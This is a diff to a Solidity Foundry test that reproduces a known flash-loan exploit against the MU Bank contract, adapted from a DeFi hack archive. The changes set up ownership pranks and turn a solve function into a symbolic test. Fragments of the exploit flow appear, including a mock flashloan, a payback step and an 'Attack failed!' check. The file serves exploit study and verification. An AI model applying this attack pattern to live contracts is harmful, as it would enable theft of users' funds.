@@ -21,6 +21,8 @@ contract MUMUGTest is Test, BlockLoader {
     UniswapV2Factory factory;
     UniswapV2Router router;
 
+    address constant owner = 0x3D87AD5D1686e240aBA58775a76B376d5CddDA3B;
+
     // Load from cheats.createSelectFork("Avalanche", 23435294);
     uint256 totalSupplyUSDC_e = 193102891951559;
     uint256 totalSupplyMU = 2000000000000000000000000;
@@ -39,6 +41,7 @@ contract MUMUGTest is Test, BlockLoader {
     uint256 bankBalanceMU = 100000 * 10e18;
 
     function setUp() public {
+        vm.startPrank(owner);
         // Initial Tokens
         // Dont change the order of contract initialization.
         mu = new ERC20Basic(totalSupplyMU);
@@ -61,18 +64,15 @@ contract MUMUGTest is Test, BlockLoader {
         );
         usdc_e.transfer(address(pair), pairBalance0);
         mu.transfer(address(pair), pairBalance1);
-        address[4] memory pairs = [
-            address(pair),
-            address(0),
-            address(0),
-            address(0)
-        ];
-        factory = new UniswapV2Factory(address(0xdead), pairs);
+        address pair0 = address(pair);
+        factory = new UniswapV2Factory(address(0xdead), pair0, address(0x0), address(0x0));
         router = new UniswapV2Router(address(factory), address(0xdead));
 
         // Initial Bank
         bank = new MuBank(address(router), address(pair), address(mu));
         mu.transfer(address(bank), bankBalanceMU);
+
+        vm.stopPrank();
 
         // vm.label(address(bank), "Bank");
         // vm.label(address(mu), "MU");
@@ -81,8 +81,8 @@ contract MUMUGTest is Test, BlockLoader {
         // vm.label(address(pair), "Pair");
     }
 
-    function self() public pure returns (address) {
-        return 0x3D87AD5D1686e240aBA58775a76B376d5CddDA3B;
+    function self() public view returns (address) {
+        return address(this);
     }
 
     function print(string memory tips) public {
@@ -154,7 +154,7 @@ contract MUMUGTest is Test, BlockLoader {
         require(usdc_e.balanceOf(self()) >= 10e6, "Attack failed!");
     }
 
-    function solve(
+    function testSymbolic(
         uint256 flashloanAmount,
         uint256 swapAmount,
         uint256 sendAmount
@@ -171,7 +171,6 @@ contract MUMUGTest is Test, BlockLoader {
         // This attack is different from the original one:
         // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
         // I de-couple two attacks from it.
-        vm.startPrank(self());
         print("Before exploit: ");
 
         // Step 1, mock to flashloan MU.
@@ -199,6 +198,5 @@ contract MUMUGTest is Test, BlockLoader {
         flashLoanPayback(paybackAmount);
 
         print("After exploit: ");
-        vm.stopPrank();
     }
 }
